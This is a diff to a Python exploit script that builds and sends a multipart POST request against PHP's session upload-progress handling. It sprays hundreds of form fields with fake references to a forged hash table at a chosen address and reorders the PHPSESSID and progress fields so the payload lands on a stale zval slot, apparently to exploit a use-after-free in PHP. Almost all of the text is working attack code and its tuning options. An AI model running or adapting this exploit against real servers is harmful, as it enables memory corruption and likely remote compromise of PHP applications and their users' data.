@@ -54,30 +54,44 @@ def field_name(prefix, index, length):
 
 
 def build(ht, ht_addr, n1, n2, value_len, sid, progress, refcount, name_len,
-          boundary=BOUNDARY):
-    spray = spray_value(value_len, ht_addr, refcount, 0x0107)
+          boundary=BOUNDARY, first=8, sid_first=False, sid_last=False, sid_field=True):
+    spray = spray_value(value_len, ht_addr, refcount, 0x0107, first=first)
     out = bytearray()
 
     def part(name, value):
         out.extend(b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\""
                    + name + b"\"\r\n\r\n" + value + b"\r\n")
 
+    # The session module parses the whole body at request startup, in field order, so the id string is
+    # allocated wherever its field sits. If it lands on the stale zval slot the spray can never cover
+    # that slot; sending the id last puts it behind the whole spray instead. The progress field always
+    # goes with it - without it the upload-progress callback never starts a session.
+    def sid_parts():
+        if sid_field:
+            part(b"PHPSESSID", sid)
+        part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
+
+    if sid_first:
+        sid_parts()
     for i in range(n1):
         part(field_name(b"s", i, name_len), spray)
     part(b"ht", ht)
-    part(b"PHPSESSID", sid)
-    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
+    if not sid_first and not sid_last:
+        sid_parts()
     for i in range(n2):
         part(field_name(b"t", i, name_len), spray)
+    if sid_last:
+        sid_parts()
     out.extend(b"--" + boundary + b"--\r\n")
     return bytes(out)
 
 
-def send(host, port, path, body, timeout):
+def send(host, port, path, body, timeout, sid=None):
+    cookie = ("Cookie: PHPSESSID=%s\r\n" % sid) if sid else ""
     request = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
                "Content-Type: multipart/form-data; boundary=%s\r\n"
-               "Content-Length: %d\r\nConnection: close\r\n\r\n"
-               % (path, host, port, BOUNDARY.decode(), len(body))).encode()
+               "%sContent-Length: %d\r\nConnection: close\r\n\r\n"
+               % (path, host, port, BOUNDARY.decode(), cookie, len(body))).encode()
     try:
         sock = socket.create_connection((host, port), timeout=timeout)
     except OSError as exc:
@@ -103,14 +117,27 @@ def main():
     ap.add_argument("--url", default="http://127.0.0.1:18110/index.php")
     ap.add_argument("--ht-addr", required=True, help="address of the fake array (S)")
     ap.add_argument("--ht-file", required=True, help="bytes built by mk_fake_ht.py")
-    ap.add_argument("--vl", type=int, default=384)
-    ap.add_argument("--n1", type=int, default=500)
+    ap.add_argument("--vl", type=lambda x: int(x, 0), default=384)
+    ap.add_argument("--n1", type=lambda x: int(x, 0), default=500)
     ap.add_argument("--n2", type=int, default=495)
     ap.add_argument("--name-len", type=int, default=10)
     ap.add_argument("--rc", type=int, default=1)
+    ap.add_argument("--first", type=lambda x: int(x, 0), default=8,
+                    help="byte offset of the first fake reference inside a spray value; the profile "
+                         "sets it so a reference lands exactly on the stale zval")
+    ap.add_argument("--sid-first", action="store_true",
+                    help="send PHPSESSID before the spray, so the id string cannot land on the "
+                         "stale zval slot")
+    ap.add_argument("--sid-last", action="store_true",
+                    help="send PHPSESSID after the spray, so the id string is allocated behind it")
+    ap.add_argument("--no-sid-field", action="store_true",
+                    help="send the id only in the Cookie header, so no id string is allocated while "
+                         "the body is parsed")
     ap.add_argument("--sid", default="a" * 32)
     ap.add_argument("--progress", default="k0")
     ap.add_argument("--timeout", type=float, default=120.0)
+    ap.add_argument("--dump-body", default="",
+                    help="write the raw response to this file (debugging an answered B2)")
     args = ap.parse_args()
 
     with open(args.ht_file, "rb") as handle:
@@ -120,9 +147,14 @@ def main():
     hostport, _, path = hostport.partition("/")
     host, _, port = hostport.partition(":")
     body = build(ht, ht_addr, args.n1, args.n2, args.vl, args.sid.encode(),
-                 args.progress.encode(), args.rc, args.name_len)
-    response, error = send(host, int(port or 80), "/" + path, body, args.timeout)
+                 args.progress.encode(), args.rc, args.name_len, first=args.first,
+                 sid_first=args.sid_first, sid_last=args.sid_last,
+                 sid_field=not args.no_sid_field)
+    response, error = send(host, int(port or 80), "/" + path, body, args.timeout, args.sid)
     status = response.split(b"\r\n", 1)[0][:40].decode("latin1", "replace") if response else ""
+    if args.dump_body:
+        with open(args.dump_body, "wb") as handle:
+            handle.write(response)
     print("b2 vl=%d n1=%d n2=%d rc=%d S=%#x ht=%d body=%d response=%d %s%s"
           % (args.vl, args.n1, args.n2, args.rc, ht_addr, len(ht), len(body), len(response), status,
              "  [socket %s]" % error if error else ""))
